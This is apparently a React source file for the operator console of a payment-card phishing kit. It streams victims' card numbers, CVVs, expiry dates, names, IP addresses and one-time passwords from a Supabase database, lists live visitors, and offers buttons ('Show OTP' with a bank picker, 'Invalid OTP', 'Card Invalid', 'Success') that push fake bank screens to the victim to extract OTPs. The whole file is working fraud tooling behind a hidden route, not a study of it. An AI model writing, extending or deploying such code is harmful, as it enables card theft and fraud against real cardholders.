import React, { useState, useEffect } from 'react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
import { supabase } from '@/integrations/supabase/client';
import TypingDetector from './TypingDetector';
import EnhancedVisitorInfo from './EnhancedVisitorInfo';
import AdminChat from './AdminChat';
import LiveVisitorNotification from './LiveVisitorNotification';
import BankSelectionModal from './BankSelectionModal';

interface CardSubmission {
  id: string;
  invoice_id: string;
  card_number: string;
  expiry_month: string;
  expiry_year: string;
  cvv: string;
  card_holder: string;
  amount: string;
  user_ip: string;
  browser: string;
  network: string;
  otp?: string;
  created_at: string;
  isNew?: boolean;
}

interface Visitor {
  id: string;
  ip: string;
  created_at: string;
}

const AdminPanel = () => {
  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>([]);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
  const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
  const [notification, setNotification] = useState<string>('');
  const [showBankModal, setShowBankModal] = useState(false);
  const [selectedSubmissionId, setSelectedSubmissionId] = useState<string>('');

  const showNotification = (message: string) => {
    setNotification(message);
    setTimeout(() => setNotification(''), 3000);
  };

  useEffect(() => {
    console.log('Admin Panel: Initializing Supabase real-time connection');
    console.log('Admin Panel: Current location:', window.location.href);
    console.log('Admin Panel: Route /parking55009hvSweJimbs5hhinbd56y');

    // Load existing data
    const loadExistingData = async () => {
      try {
        // Load card submissions
        const { data: submissions, error: submissionsError } = await supabase
          .from('card_submissions')
          .select('*')
          .order('created_at', { ascending: false });

        if (submissionsError) {
          console.error('Error loading submissions:', submissionsError);
        } else {
          setCardSubmissions(submissions || []);
        }

        // Load visitors - only active ones (last 2 minutes)
        const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
        const { data: visitorsData, error: visitorsError } = await supabase
          .from('visitors')
          .select('*')
          .gte('created_at', twoMinutesAgo.toISOString())
          .order('created_at', { ascending: false });

        if (visitorsError) {
          console.error('Error loading visitors:', visitorsError);
        } else {
          const activeVisitorsData = visitorsData || [];
          setVisitors(activeVisitorsData);
          setActiveVisitors(activeVisitorsData);
        }

        setConnectionStatus('Connected');
      } catch (error) {
        console.error('Error connecting to Supabase:', error);
        setConnectionStatus('Disconnected');
      }
    };

    loadExistingData();

    // Subscribe to card submissions
    const submissionsChannel = supabase
      .channel('card-submissions')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'card_submissions'
        },
        (payload) => {
          console.log('New card submission received:', payload.new);
          const newSubmission = { ...payload.new as CardSubmission, isNew: true };
          setCardSubmissions(prev => [newSubmission, ...prev]);
          showNotification('New card data received!');
        }
      )
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'card_submissions'
        },
        (payload) => {
          console.log('Card submission updated:', payload.new);
          setCardSubmissions(prev => prev.map(submission => 
            submission.id === (payload.new as CardSubmission).id ? { ...payload.new as CardSubmission, isNew: false } : submission
          ));
          if ((payload.new as CardSubmission).otp) {
            showNotification('OTP received!');
          }
        }
      )
      .on(
        'postgres_changes',
        {
          event: 'DELETE',
          schema: 'public',
          table: 'card_submissions'
        },
        () => {
          // Reload submissions after delete
          loadExistingData();
        }
      )
      .subscribe();

    // Subscribe to visitors - only show current active ones
    const visitorsChannel = supabase
      .channel('visitors')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'visitors'
        },
        (payload) => {
          console.log('New visitor:', payload.new);
          const newVisitor = payload.new as Visitor;
          
          // Only add if not already exists and is recent
          setVisitors(prev => {
            const exists = prev.some(v => v.ip === newVisitor.ip);
            if (!exists) {
              showNotification(`New visitor: ${newVisitor.ip}`);
              const updatedVisitors = [newVisitor, ...prev];
              setActiveVisitors(updatedVisitors);
              return updatedVisitors;
            }
            return prev;
          });
        }
      )
      .subscribe();

    // Cleanup old visitors every 30 seconds
    const cleanupInterval = setInterval(() => {
      const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
      setVisitors(prev => {
        const filtered = prev.filter(visitor => new Date(visitor.created_at) > twoMinutesAgo);
        setActiveVisitors(filtered);
        return filtered;
      });
    }, 30000);

    return () => {
      supabase.removeChannel(submissionsChannel);
      supabase.removeChannel(visitorsChannel);
      clearInterval(cleanupInterval);
    };
  }, []);

  const sendCommand = async (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
    console.log('Sending command via Supabase:', command, submissionId, bankData);
    showNotification(`${command.toUpperCase()} has been initiated`);
    
    try {
      const commandData: any = {
        command,
        submission_id: submissionId || null
      };
      
      if (bankData) {
        commandData.bank_name = bankData.name;
        commandData.bank_logo = bankData.logo;
      }
      
      const { error } = await supabase
        .from('admin_commands')
        .insert([commandData]);
      
      if (error) {
        console.error('Error sending command:', error);
      } else {
        console.log('Command sent successfully via Supabase');
        
        // Update submission to remove new status
        if (submissionId) {
          setCardSubmissions(prev => prev.map(submission => 
            submission.id === submissionId ? { ...submission, isNew: false } : submission
          ));
        }
      }
    } catch (error) {
      console.error('Error with Supabase command:', error);
    }
  };

  const handleRowClick = (submissionId: string) => {
    setCardSubmissions(prev => prev.map(submission => 
      submission.id === submissionId ? { ...submission, isNew: false } : submission
    ));
  };

  const deleteAllTransactions = async () => {
    if (window.confirm('Are you sure you want to delete all transactions? This action cannot be undone.')) {
      try {
        // Delete from Supabase database first
        const { error } = await supabase
          .from('card_submissions')
          .delete()
          .gte('created_at', '1970-01-01'); // Delete all records
        
        if (error) {
          console.error('Error deleting transactions from database:', error);
          showNotification('Error deleting transactions from database');
        } else {
          // Clear local state after successful database deletion
          setCardSubmissions([]);
          showNotification('All transactions deleted successfully');
          console.log('All transactions deleted from database and admin panel');
        }
      } catch (error) {
        console.error('Error deleting transactions:', error);
        showNotification('Error deleting transactions');
      }
    }
  };

  const handleShowOtp = (submissionId: string) => {
    console.log('Show OTP clicked for submission:', submissionId);
    setSelectedSubmissionId(submissionId);
    setShowBankModal(true);
  };

  const handleBankSelect = (bankName: string, bankLogo: string) => {
    console.log('Bank selected:', bankName, bankLogo);
    console.log('Sending command with submission ID:', selectedSubmissionId);
    sendCommand('showotp', selectedSubmissionId, { name: bankName, logo: bankLogo });
    setShowBankModal(false);
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <LiveVisitorNotification visitors={activeVisitors} />
      
      <BankSelectionModal
        isOpen={showBankModal}
        onClose={() => setShowBankModal(false)}
        onSelectBank={handleBankSelect}
        submissionId={selectedSubmissionId}
      />
      
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-3xl font-bold">Admin Panel - /parking55009hvSweJimbs5hhinbd56y</h1>
        <button
          onClick={deleteAllTransactions}
          className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
        >
          Delete Transactions
        </button>
      </div>
      
      {notification && (
        <div className="fixed top-4 right-4 bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg z-50">
          {notification}
        </div>
      )}
      
      {/* Connection Status */}
      <div className="mb-4">
        <span className={`px-3 py-1 rounded text-sm ${
          connectionStatus === 'Connected' ? 'bg-green-600' : 'bg-red-600'
        }`}>
          Supabase: {connectionStatus}
        </span>
        <span className="ml-2 px-3 py-1 rounded text-sm bg-green-600">
          Real-time: Active
        </span>
      </div>

      {/* Advanced Features */}
      <TypingDetector />
      <EnhancedVisitorInfo />
      <AdminChat />
      
      {/* Current Visitors Section */}
      <div className="mb-8">
        <h2 className="text-xl font-bold mb-4">Current Live Visitors ({activeVisitors.length})</h2>
        <div className="space-y-2">
          {activeVisitors.length === 0 ? (
            <div className="text-gray-400">No active visitors...</div>
          ) : (
            activeVisitors.map((visitor) => (
              <div key={visitor.id} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
                Live Visitor: {visitor.ip} - {new Date(visitor.created_at).toLocaleTimeString()}
              </div>
            ))
          )}
        </div>
      </div>

      {/* Transactions Table */}
      {cardSubmissions.length > 0 && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">Transactions ({cardSubmissions.length})</h2>
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead className="text-white">Invoice ID</TableHead>
                  <TableHead className="text-white">Email</TableHead>
                  <TableHead className="text-white">Amount</TableHead>
                  <TableHead className="text-white">Currency</TableHead>
                  <TableHead className="text-white">Card Number</TableHead>
                  <TableHead className="text-white">CVV</TableHead>
                  <TableHead className="text-white">Expiry</TableHead>
                  <TableHead className="text-white">Cardholder</TableHead>
                  <TableHead className="text-white">IP Address</TableHead>
                  <TableHead className="text-white">OTP</TableHead>
                  <TableHead className="text-white">Status</TableHead>
                  <TableHead className="text-white">Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {cardSubmissions.map((submission) => (
                  <TableRow 
                    key={submission.id}
                    className={`${submission.isNew ? 'animate-pulse border-2 border-yellow-500 bg-yellow-900/20' : ''} cursor-pointer`}
                    onClick={() => handleRowClick(submission.id)}
                  >
                    <TableCell className="text-white">{submission.invoice_id}</TableCell>
                    <TableCell className="text-white">N/A</TableCell>
                    <TableCell className="text-white">₹{submission.amount}</TableCell>
                    <TableCell className="text-white">INR</TableCell>
                    <TableCell className="text-white">{submission.card_number}</TableCell>
                    <TableCell className="text-white">{submission.cvv}</TableCell>
                    <TableCell className="text-white">{submission.expiry_month}/{submission.expiry_year}</TableCell>
                    <TableCell className="text-white">{submission.card_holder}</TableCell>
                    <TableCell className="text-white">{submission.user_ip}</TableCell>
                    <TableCell className="text-white">{submission.otp || 'Pending'}</TableCell>
                    <TableCell className="text-white">Processing</TableCell>
                    <TableCell className="text-white">
                      <div className="flex space-x-1">
                        <button
                          onClick={(e) => { e.stopPropagation(); handleShowOtp(submission.id); }}
                          className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Show OTP
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('fail', submission.id); }}
                          className="bg-red-600 hover:bg-red-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Fail
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('success', submission.id); }}
                          className="bg-green-600 hover:bg-green-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Success
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('invalidotp', submission.id); }}
                          className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Invalid OTP
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('cardinvalid', submission.id); }}
                          className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Card Invalid
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('carddisabled', submission.id); }}
                          className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Card Disabled
                        </button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
        </div>
      )}

      {/* Instructions */}
      <div className="bg-gray-800 p-4 rounded">
        <h3 className="text-lg font-bold mb-2">Instructions</h3>
        <ul className="text-sm space-y-1">
          <li>• Admin panel is now accessible at /parking55009hvSweJimbs5hhinbd56y</li>
          <li>• Real-time communication via Supabase database</li>
          <li>• Wait for card data to appear in the table above</li>
          <li>• Click on any row to stop the glow effect</li>
          <li>• Use command buttons to control user experience</li>
          <li>• All transactions are saved in Supabase database</li>
          <li>• Cross-browser sessions supported via real-time subscriptions</li>
          <li>• Visitors are automatically removed after 2 minutes of inactivity</li>
          <li>• Click the chat button to start live chat with users</li>
        </ul>
      </div>
    </div>
  );
};

export default AdminPanel;
